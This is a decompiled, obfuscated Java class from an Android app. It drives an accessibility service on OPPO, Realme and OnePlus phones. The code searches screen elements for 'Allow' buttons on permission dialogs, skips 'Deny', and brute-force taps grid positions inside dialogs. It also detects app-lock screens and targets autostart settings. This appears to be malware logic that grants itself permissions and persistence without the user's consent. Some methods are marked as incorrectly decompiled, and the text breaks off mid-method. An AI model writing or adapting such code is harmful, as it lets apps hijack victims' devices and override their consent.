package com.storm.safe.rock.service.modules.yw5xud;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Path;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.storm.safe.rock.R$string;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0328b3;
import com.storm.safe.rock.service.modules.yw5xud.umrkmgrri;
import com.storm.safe.rock.util.StringUtil;
import io.socket.engineio.parser.Base64;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import kotlin.AbstractC0767a0;
import kotlin.Pair;
import kotlin.collections.EmptyList;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import kotlin.text.AbstractC0779a1;
import okhttp3.internal.p032ws.WebSocketProtocol;
import okio.internal.Buffer;
import org.conscrypt.FileClientSessionCache;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.AbstractC0716jf;
import p000.AbstractC0717jg;
import p000.C0429du;
import p000.C1214s9;
import p000.C1351vv;
import p000.RunnableC0029ai;
import p000.RunnableC0941o6;
import p000.b81;
import p000.kg1;
import p000.kj1;
import p000.oe0;
import p000.ql0;
import p000.rl0;
import p000.t60;
import p000.tz0;
import p000.w00;
import p000.y90;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.yw5xud.a5 */
/* loaded from: classes2.dex */
public final class C0368a5 {

    /* renamed from: a0 */
    public final AccessibilityService f55111a0;

    /* renamed from: a1 */
    public final Context f55112a1;

    /* renamed from: a2 */
    public final int f55113a2;

    /* renamed from: a3 */
    public final String f55114a3;

    /* renamed from: a4 */
    public final boolean f55115a4;

    /* renamed from: a5 */
    public final boolean f55116a5;

    /* renamed from: a6 */
    public final boolean f55117a6;

    /* renamed from: a7 */
    public final boolean f55118a7;

    /* renamed from: a8 */
    public final boolean f55119a8;

    /* renamed from: a9 */
    public final y90 f55120a9;

    /* renamed from: b0 */
    public final long f55121b0;

    /* renamed from: b1 */
    public final long f55122b1;

    /* renamed from: b2 */
    public final long f55123b2;

    /* renamed from: b3 */
    public final long f55124b3;

    /* renamed from: b4 */
    public final long f55125b4;

    /* renamed from: b5 */
    public final long f55126b5;

    /* renamed from: b6 */
    public final y90 f55127b6;

    /* renamed from: b7 */
    public final y90 f55128b7;

    /* renamed from: b8 */
    public final String f55129b8;

    /* renamed from: b9 */
    public final String f55130b9;

    /* renamed from: c0 */
    public int f55131c0;

    static {
        new ql0(null);
    }

    public C0368a5(AccessibilityService accessibilityService, Context context) {
        t60.m214695b6(accessibilityService, "service");
        t60.m214695b6(context, "context");
        this.f55111a0 = accessibilityService;
        this.f55112a1 = context;
        int i = Build.VERSION.SDK_INT;
        this.f55113a2 = i;
        String str = Build.MODEL;
        t60.m214694b5(str, "MODEL");
        String upperCase = str.toUpperCase(Locale.ROOT);
        t60.m214694b5(upperCase, "this as java.lang.String).toUpperCase(Locale.ROOT)");
        this.f55114a3 = upperCase;
        this.f55115a4 = i == 29;
        this.f55116a5 = i == 30;
        this.f55117a6 = i == 31 || i == 32;
        this.f55118a7 = i == 33;
        this.f55119a8 = i >= 34;
        AbstractC0779a1.m213652a5(upperCase, "RMX3823", false);
        AbstractC0779a1.m213652a5(upperCase, "RMX1991", false);
        AbstractC0779a1.m213652a5(upperCase, "PKA110", false);
        AbstractC0779a1.m213652a5(upperCase, "PHM110", false);
        AbstractC0779a1.m213652a5(upperCase, "PEDM00", false);
        AbstractC0779a1.m213652a5(upperCase, "PHB110", false);
        this.f55120a9 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$subBrand$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                String str2 = Build.BRAND;
                t60.m214694b5(str2, "BRAND");
                Locale locale = Locale.ROOT;
                String lowerCase = str2.toLowerCase(locale);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                String str3 = Build.MANUFACTURER;
                t60.m214694b5(str3, "MANUFACTURER");
                String lowerCase2 = str3.toLowerCase(locale);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                String lowerCase3 = this.f54638a0.f55114a3.toLowerCase(locale);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                return (AbstractC0779a1.m213652a5(lowerCase, "realme", false) || AbstractC0779a1.m213652a5(lowerCase2, "realme", false) || AbstractC0779a1.m213652a5(lowerCase3, "realme", false)) ? OppoStepsSimplified$SubBrand.f54520a1 : (AbstractC0779a1.m213652a5(lowerCase, "oneplus", false) || AbstractC0779a1.m213652a5(lowerCase2, "oneplus", false) || AbstractC0779a1.m213652a5(lowerCase3, "oneplus", false)) ? OppoStepsSimplified$SubBrand.f54521a2 : (AbstractC0779a1.m213652a5(lowerCase, "oplus", false) || AbstractC0779a1.m213652a5(lowerCase2, "oplus", false) || AbstractC0779a1.m213652a5(lowerCase3, "oplus", false)) ? OppoStepsSimplified$SubBrand.f54522a3 : OppoStepsSimplified$SubBrand.f54519a0;
            }
        });
        this.f55121b0 = 100L;
        this.f55122b1 = 300L;
        this.f55123b2 = 500L;
        this.f55124b3 = 200L;
        this.f55125b4 = 150L;
        this.f55126b5 = 300L;
        this.f55127b6 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$appName$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                C0368a5 c0368a5 = this.f54524a0;
                try {
                    return c0368a5.f55112a1.getPackageManager().getApplicationLabel(c0368a5.f55112a1.getApplicationInfo()).toString();
                } catch (Exception unused) {
                    String string = c0368a5.f55112a1.getString(R$string.app_name);
                    t60.m214694b5(string, "{ context.getString(R.string.app_name) }");
                    return string;
                }
            }
        });
        this.f55128b7 = AbstractC0767a0.m213609a0(new w00() { // from class: com.storm.safe.rock.service.modules.yw5xud.OppoStepsSimplified$prefs$2
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                return this.f54633a0.f55112a1.getSharedPreferences("oppo_simplified_v6", 0);
            }
        });
        this.f55129b8 = "autostart_background";
        this.f55130b9 = "autostart_switch";
    }

    /* renamed from: b0 */
    public static void m212295b0(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence text = accessibilityNodeInfo.getText();
        String string2 = (text == null || (string = text.toString()) == null) ? null : AbstractC0779a1.m213687e0(string).toString();
        if (string2 != null && string2.length() != 0 && string2.length() < 50) {
            arrayList.add(string2);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212295b0(child, arrayList);
            }
        }
    }

    /* renamed from: b1 */
    public static int m212296b1(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return 0;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        int iM212296b1 = 1;
        for (int i = 0; i < childCount; i++) {
            iM212296b1 += m212296b1(accessibilityNodeInfo.getChild(i));
        }
        return iM212296b1;
    }

    /* renamed from: b4 */
    public static final void m212297b4(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence text = accessibilityNodeInfo.getText();
        String string2 = text != null ? text.toString() : null;
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        String string3 = contentDescription != null ? contentDescription.toString() : null;
        CharSequence className = accessibilityNodeInfo.getClassName();
        String strM213684d7 = (className == null || (string = className.toString()) == null) ? "" : AbstractC0779a1.m213684d7(string, ".");
        boolean zIsClickable = accessibilityNodeInfo.isClickable();
        if (string2 != null && string2.length() != 0) {
            StringBuilder sbM41c2 = AbstractC0003a2.m41c2("[", strM213684d7, zIsClickable ? "★" : "", "] \"", string2);
            sbM41c2.append("\"");
            arrayList.add(sbM41c2.toString());
        }
        if (string3 != null && string3.length() != 0 && !string3.equals(string2)) {
            StringBuilder sbM41c22 = AbstractC0003a2.m41c2("[", strM213684d7, "/desc", zIsClickable ? "★" : "", "] \"");
            sbM41c22.append(string3);
            sbM41c22.append("\"");
            arrayList.add(sbM41c22.toString());
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212297b4(child, arrayList);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:126:0x027f  */
    /* JADX WARN: Removed duplicated region for block: B:140:0x01e0 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:82:0x01cc  */
    /* renamed from: d2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m212298d2(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr, boolean z) {
        String string;
        String string2;
        String string3;
        String string4;
        for (String str : strArr) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText != null) {
                try {
                    try {
                        if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                            if (z) {
                                m212303e0("[查找按钮] '" + str + "': 找到 " + listFindAccessibilityNodeInfosByText.size() + " 个节点");
                            }
                            for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                                if (accessibilityNodeInfo2.isVisibleToUser()) {
                                    CharSequence text = accessibilityNodeInfo2.getText();
                                    String str2 = "";
                                    if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                                        string = "";
                                    }
                                    CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                                    if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                        string2 = "";
                                    }
                                    CharSequence className = accessibilityNodeInfo2.getClassName();
                                    if (className != null && (string3 = className.toString()) != null) {
                                        str2 = string3;
                                    }
                                    boolean zIsClickable = accessibilityNodeInfo2.isClickable();
                                    boolean zIsEnabled = accessibilityNodeInfo2.isEnabled();
                                    if (z) {
                                        m212303e0("[查找按钮] 节点: text='" + string + "', desc='" + string2 + "', class=" + str2 + ", 可点击=" + zIsClickable + ", 启用=" + zIsEnabled);
                                    }
                                    if (string.equals(AbstractC0779a1.m213687e0(str).toString())) {
                                        if (z) {
                                            m212303e0("[查找按钮] ✅ 精确匹配: '" + string + "'");
                                        }
                                        if (zIsClickable && zIsEnabled) {
                                            if (m212304f0(accessibilityNodeInfo2)) {
                                                m212303e0("[查找按钮] ✅✅✅ 点击成功! '" + string + "'");
                                                Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                                while (it.hasNext()) {
                                                    ((AccessibilityNodeInfo) it.next()).recycle();
                                                }
                                                return true;
                                            }
                                            if (z) {
                                                m212303e0("[查找按钮] ❌ 点击失败，尝试下一个节点");
                                            }
                                        } else if (z) {
                                            m212303e0("[查找按钮] ⚠️ 节点不可点击或未启用");
                                        }
                                    } else if (z) {
                                        m212303e0("[查找按钮] ⚠️ 不精确匹配: '" + string + "' != '" + str + "'");
                                    }
                                } else if (z) {
                                    m212303e0("[查找按钮] 跳过: 不可见");
                                }
                            }
                            Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it2.hasNext()) {
                                ((AccessibilityNodeInfo) it2.next()).recycle();
                            }
                        } else if (listFindAccessibilityNodeInfosByText == null) {
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                        }
                    } catch (Throwable th) {
                        Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it4.hasNext()) {
                            ((AccessibilityNodeInfo) it4.next()).recycle();
                        }
                        throw th;
                    }
                } catch (Exception e) {
                    if (z) {
                        m212303e0("[查找按钮] 搜索'" + str + "'异常: " + e.getMessage());
                    }
                    Iterator<T> it5 = listFindAccessibilityNodeInfosByText.iterator();
                    while (it5.hasNext()) {
                        ((AccessibilityNodeInfo) it5.next()).recycle();
                    }
                }
            } else if (listFindAccessibilityNodeInfosByText == null) {
            }
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfo.findAccessibilityNodeInfosByText("允许");
        try {
            if (listFindAccessibilityNodeInfosByText2 != null) {
                try {
                    if (!listFindAccessibilityNodeInfosByText2.isEmpty()) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo3 : listFindAccessibilityNodeInfosByText2) {
                            if (accessibilityNodeInfo3.isVisibleToUser() && accessibilityNodeInfo3.isClickable() && accessibilityNodeInfo3.isEnabled() && m212304f0(accessibilityNodeInfo3)) {
                                m212303e0("[查找按钮] ✅✅✅ '允许'点击成功!");
                                Iterator<T> it6 = listFindAccessibilityNodeInfosByText2.iterator();
                                while (it6.hasNext()) {
                                    ((AccessibilityNodeInfo) it6.next()).recycle();
                                }
                                return true;
                            }
                        }
                    }
                    if (listFindAccessibilityNodeInfosByText2 != null) {
                        Iterator<T> it7 = listFindAccessibilityNodeInfosByText2.iterator();
                        while (it7.hasNext()) {
                            ((AccessibilityNodeInfo) it7.next()).recycle();
                        }
                    }
                } catch (Exception e2) {
                    if (z) {
                        m212303e0("[查找按钮] 搜索'允许'异常: " + e2.getMessage());
                    }
                    Iterator<T> it8 = listFindAccessibilityNodeInfosByText2.iterator();
                    while (it8.hasNext()) {
                        ((AccessibilityNodeInfo) it8.next()).recycle();
                    }
                }
            } else if (listFindAccessibilityNodeInfosByText2 != null) {
            }
            return false;
        } catch (Throwable th2) {
            Iterator<T> it9 = listFindAccessibilityNodeInfosByText2.iterator();
            while (it9.hasNext()) {
                ((AccessibilityNodeInfo) it9.next()).recycle();
            }
            throw th2;
        }
    }

    /* renamed from: d3 */
    public static AccessibilityNodeInfo m212299d3(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212299d3;
        if (accessibilityNodeInfo.isScrollable()) {
            return accessibilityNodeInfo;
        }
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "RecyclerView", false) || AbstractC0779a1.m213652a5(string, "ListView", false) || AbstractC0779a1.m213652a5(string, "ScrollView", false) || AbstractC0779a1.m213652a5(string, "NestedScrollView", false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212299d3 = m212299d3(child)) != null) {
                return accessibilityNodeInfoM212299d3;
            }
        }
        return null;
    }

    /* renamed from: d4 */
    public static AccessibilityNodeInfo m212300d4(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212300d4;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "Toggle", false) || AbstractC0779a1.m213652a5(string, "CompoundButton", false)) && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212300d4 = m212300d4(child)) != null) {
                return accessibilityNodeInfoM212300d4;
            }
        }
        return null;
    }

    /* renamed from: d5 */
    public static AccessibilityNodeInfo m212301d5(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        String string3;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false) || AbstractC0779a1.m213652a5(string, "CompoundButton", false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                CharSequence className2 = child.getClassName();
                if (className2 == null || (string3 = className2.toString()) == null) {
                    string3 = "";
                }
                if (AbstractC0779a1.m213652a5(string3, "Switch", false) || AbstractC0779a1.m213652a5(string3, "CheckBox", false) || AbstractC0779a1.m213652a5(string3, "ToggleButton", false) || AbstractC0779a1.m213652a5(string3, "CompoundButton", false)) {
                    return child;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM212301d5 = m212301d5(child);
                if (accessibilityNodeInfoM212301d5 != null) {
                    return accessibilityNodeInfoM212301d5;
                }
            }
        }
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        for (int i2 = 0; parent != null && i2 < 3; i2++) {
            int childCount2 = parent.getChildCount();
            for (int i3 = 0; i3 < childCount2; i3++) {
                AccessibilityNodeInfo child2 = parent.getChild(i3);
                if (child2 != null) {
                    CharSequence className3 = child2.getClassName();
                    if (className3 == null || (string2 = className3.toString()) == null) {
                        string2 = "";
                    }
                    if (AbstractC0779a1.m213652a5(string2, "Switch", false) || AbstractC0779a1.m213652a5(string2, "CheckBox", false) || AbstractC0779a1.m213652a5(string2, "ToggleButton", false) || AbstractC0779a1.m213652a5(string2, "CompoundButton", false)) {
                        return child2;
                    }
                }
            }
            parent = parent.getParent();
        }
        return null;
    }

    /* renamed from: d6 */
    public static void m212302d6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "Toggle", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "CompoundButton", false)) && accessibilityNodeInfo.isVisibleToUser()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212302d6(child, arrayList);
            }
        }
    }

    /* renamed from: e0 */
    public static void m212303e0(String str) {
        tz0.m214807a7("│ ", str, "OppoSteps");
    }

    /* renamed from: f0 */
    public static boolean m212304f0(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        try {
            boolean[] zArr = {false};
            CountDownLatch countDownLatch = new CountDownLatch(1);
            new Handler(Looper.getMainLooper()).post(new RunnableC0029ai(zArr, accessibilityNodeInfo, countDownLatch, 2));
            countDownLatch.await(500L, TimeUnit.MILLISECONDS);
            return zArr[0];
        } catch (Exception e) {
            m212303e0("[主线程点击] 异常: " + e.getMessage());
            return false;
        }
    }

    /* renamed from: a0 */
    public final boolean m212305a0() {
        String string;
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            return false;
        }
        try {
            for (String str : AbstractC0716jf.m213306g5("解锁", "解鎖", "Unlock", "UNLOCK", "취소 잠금", "잠금 해제")) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                        CharSequence text = accessibilityNodeInfo.getText();
                        String str2 = "";
                        if (text == null || (string = text.toString()) == null) {
                            string = "";
                        }
                        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                        if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                            str2 = string2;
                        }
                        if ((string.equals(str) || t60.m214686a2(AbstractC0779a1.m213687e0(string).toString(), str) || str2.equals(str) || t60.m214686a2(AbstractC0779a1.m213687e0(str2).toString(), str)) && accessibilityNodeInfo.isVisibleToUser()) {
                            m212303e0("[锁定检查] ✅ 找到'" + str + "'按钮，APP已锁定");
                            accessibilityNodeInfo.recycle();
                            return true;
                        }
                        accessibilityNodeInfo.recycle();
                    }
                }
            }
            for (String str3 : AbstractC0716jf.m213306g5("已锁定", "已鎖定", "Locked", "LOCKED")) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str3);
                if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                    Iterator<T> it = listFindAccessibilityNodeInfosByText2.iterator();
                    while (it.hasNext()) {
                        if (((AccessibilityNodeInfo) it.next()).isVisibleToUser()) {
                            m212303e0("[锁定检查] ✅ 找到'" + str3 + "'状态，APP已锁定");
                            return true;
                        }
                    }
                }
            }
            m212303e0("[锁定检查] ⚠️ 未找到锁定标识");
            return false;
        } catch (Exception e) {
            m212303e0("[锁定检查] 异常: " + e.getMessage());
            return false;
        }
    }

    /* renamed from: a1 */
    public final boolean m212306a1(Rect rect, String str, boolean z) throws InterruptedException {
        double d;
        try {
            int iWidth = rect.width();
            int iHeight = rect.height();
            if (z) {
                m212303e0("[坐标点击] 窗口: '" + str + "', 大小: " + iWidth + " x " + iHeight);
            }
            boolean z2 = iHeight > 700;
            boolean z3 = iHeight < 600;
            double d2 = 100.0d;
            try {
                if (z2) {
                    if (z) {
                        m212303e0("[坐标点击] 聚合弹窗: X=30%-70%, Y=74%-80%");
                    }
                    int i = 30;
                    int iM213513b8 = kg1.m213513b8(30, 70, 10);
                    if (30 > iM213513b8) {
                        return false;
                    }
                    boolean z4 = false;
                    while (true) {
                        int i2 = 74;
                        int iM213513b82 = kg1.m213513b8(74, 80, 2);
                        if (74 <= iM213513b82) {
                            while (true) {
                                if (m212309a4(rect.left + ((int) ((iWidth * i) / 100.0d)), rect.top + ((int) ((iHeight * i2) / 100.0d)))) {
                                    z4 = true;
                                }
                                Thread.sleep(3L);
                                if (i2 == iM213513b82) {
                                    break;
                                }
                                i2 += 2;
                            }
                        }
                        if (i == iM213513b8) {
                            return z4;
                        }
                        i += 10;
                    }
                } else {
                    int i3 = 55;
                    if (z3) {
                        if (z) {
                            m212303e0("[坐标点击] 单权限弹窗: X=55%-85%, Y=65%-85%");
                        }
                        int i4 = 85;
                        int iM213513b83 = kg1.m213513b8(55, 85, 8);
                        if (55 > iM213513b83) {
                            return false;
                        }
                        boolean z5 = false;
                        while (true) {
                            int i5 = 65;
                            int iM213513b84 = kg1.m213513b8(65, i4, 5);
                            if (65 <= iM213513b84) {
                                while (true) {
                                    z5 = m212309a4((float) (rect.left + ((int) (((double) (iWidth * i3)) / 100.0d))), (float) (rect.top + ((int) (((double) (iHeight * i5)) / 100.0d)))) ? true : z5;
                                    Thread.sleep(3L);
                                    if (i5 == iM213513b84) {
                                        break;
                                    }
                                    i5 += 5;
                                }
                            }
                            if (i3 == iM213513b83) {
                                return z5;
                            }
                            i3 += 8;
                            i4 = 85;
                        }
                    } else {
                        if (z) {
                            m212303e0("[坐标点击] 中等高度弹窗: 尝试两种模式");
                        }
                        int iM213513b85 = kg1.m213513b8(55, 80, 10);
                        if (55 > iM213513b85) {
                            return false;
                        }
                        boolean z6 = false;
                        while (true) {
                            int i6 = 60;
                            int iM213513b86 = kg1.m213513b8(60, 80, 5);
                            if (60 <= iM213513b86) {
                                while (true) {
                                    d = d2;
                                    if (m212309a4(rect.left + ((int) ((iWidth * i3) / d2)), rect.top + ((int) ((iHeight * i6) / d)))) {
                                        z6 = true;
                                    }
                                    Thread.sleep(3L);
                                    if (i6 == iM213513b86) {
                                        break;
                                    }
                                    i6 += 5;
                                    d2 = d;
                                }
                            } else {
                                d = d2;
                            }
                            if (i3 == iM213513b85) {
                                return z6;
                            }
                            i3 += 10;
                            d2 = d;
                        }
                    }
                }
            } catch (Exception e) {
                e = e;
                m212303e0("[坐标点击] ❌ 异常: " + e.getMessage());
                return false;
            }
        } catch (Exception e2) {
            e = e2;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:72:0x0185  */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212307a2() {
        String string;
        String string2;
        Iterator<AccessibilityNodeInfo> it;
        boolean zIsChecked;
        boolean z;
        String string3;
        boolean zIsChecked2;
        int i;
        String string4;
        m212303e0("[允许按钮] ========== 精确查找[允许]按钮 ==========");
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        boolean z2 = false;
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[允许按钮] ❌ 获取root失败");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText("允许");
        m212303e0("[允许按钮] 找到" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + "个包含'允许'的节点");
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            m212303e0("[允许按钮] ❌ 未找到'允许'节点");
            return false;
        }
        Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByText.iterator();
        int i2 = 0;
        while (it2.hasNext()) {
            int i3 = i2 + 1;
            AccessibilityNodeInfo next = it2.next();
            if (next.isVisibleToUser()) {
                CharSequence text = next.getText();
                if (text == null || (string = text.toString()) == null) {
                    string = "";
                }
                CharSequence className = next.getClassName();
                if (className == null || (string2 = className.toString()) == null) {
                    string2 = "";
                }
                m212303e0("[允许按钮]   节点" + i2 + ": text='" + string + "', class=" + AbstractC0779a1.m213684d7(string2, "."));
                if (AbstractC0779a1.m213652a5(string, "不允许", z2) || AbstractC0779a1.m213652a5(string, "不允", z2) || string.equalsIgnoreCase("Deny") || string.equalsIgnoreCase("Don't allow")) {
                    it = it2;
                    m212303e0("[允许按钮]   节点" + i2 + ": 包含'不允许'，跳过");
                } else if (string.equals("允许")) {
                    m212303e0("[允许按钮]   节点" + i2 + ": ★ 精确匹配'允许'");
                    if (AbstractC0779a1.m213652a5(string2, "RadioButton", z2) || AbstractC0779a1.m213652a5(string2, "CheckBox", z2)) {
                        try {
                            zIsChecked = next.isChecked();
                        } catch (Exception unused) {
                            zIsChecked = z2;
                        }
                        z = true;
                        m212303e0("[允许按钮]   节点" + i2 + ": 是RadioButton/CheckBox, isChecked=" + zIsChecked);
                        if (zIsChecked) {
                            m212303e0("[允许按钮] ✅ RadioButton[允许]已选中");
                            return true;
                        }
                        if (next.performAction(16)) {
                            m212303e0("[允许按钮] ✅ 点击RadioButton[允许]成功!");
                            return true;
                        }
                        AccessibilityNodeInfo parent = next.getParent();
                        int i4 = 0;
                        while (parent != null && i4 < 5) {
                            CharSequence className2 = parent.getClassName();
                            if (className2 == null || (string3 = className2.toString()) == null) {
                                string3 = "";
                            }
                            Iterator<AccessibilityNodeInfo> it3 = it2;
                            m212303e0("[允许按钮]     父节点(level=" + i4 + "): class=" + string3);
                            if (AbstractC0779a1.m213652a5(string3, "RadioButton", false) || AbstractC0779a1.m213652a5(string3, "CheckBox", false)) {
                                try {
                                    zIsChecked2 = parent.isChecked();
                                } catch (Exception unused2) {
                                    zIsChecked2 = false;
                                }
                                if (zIsChecked2) {
                                    i = 16;
                                } else {
                                    i = 16;
                                    if (parent.performAction(16)) {
                                        m212303e0("[允许按钮] ✅ 点击父节点RadioButton成功!");
                                        return true;
                                    }
                                }
                            }
                            if (parent.isClickable() && parent.performAction(i)) {
                                m212303e0("[允许按钮] ✅ 点击父节点(level=" + i4 + ")成功!");
                                return true;
                            }
                            parent = parent.getParent();
                            i4++;
                            it2 = it3;
                        }
                        it = it2;
                    } else {
                        it = it2;
                        z = true;
                    }
                    boolean z3 = z;
                    if (((!AbstractC0779a1.m213652a5(string2, "Button", z3) || AbstractC0779a1.m213652a5(string2, "Switch", z3) || AbstractC0779a1.m213652a5(string2, "Toggle", z3)) ? false : true) || AbstractC0779a1.m213652a5(string2, "TextView", false)) {
                        m212303e0("[允许按钮]   节点" + i2 + ": 是Button/TextView，尝试点击...");
                        if (next.isClickable() && next.performAction(16)) {
                            m212303e0("[允许按钮] ✅ 点击Button/TextView[允许]成功!");
                            return true;
                        }
                        AccessibilityNodeInfo parent2 = next.getParent();
                        for (int i5 = 0; parent2 != null && i5 < 3; i5++) {
                            CharSequence className3 = parent2.getClassName();
                            if (className3 == null || (string4 = className3.toString()) == null) {
                                string4 = "";
                            }
                            if (AbstractC0779a1.m213652a5(string4, "Switch", false) || AbstractC0779a1.m213652a5(string4, "Toggle", false)) {
                                break;
                            }
                            if (parent2.isClickable() && parent2.performAction(16)) {
                                m212303e0("[允许按钮] ✅ 点击父节点(level=" + i5 + ")成功!");
                                return true;
                            }
                            parent2 = parent2.getParent();
                        }
                    }
                    m212303e0("[允许按钮]   节点" + i2 + ": 尝试手势点击...");
                    Rect rect = new Rect();
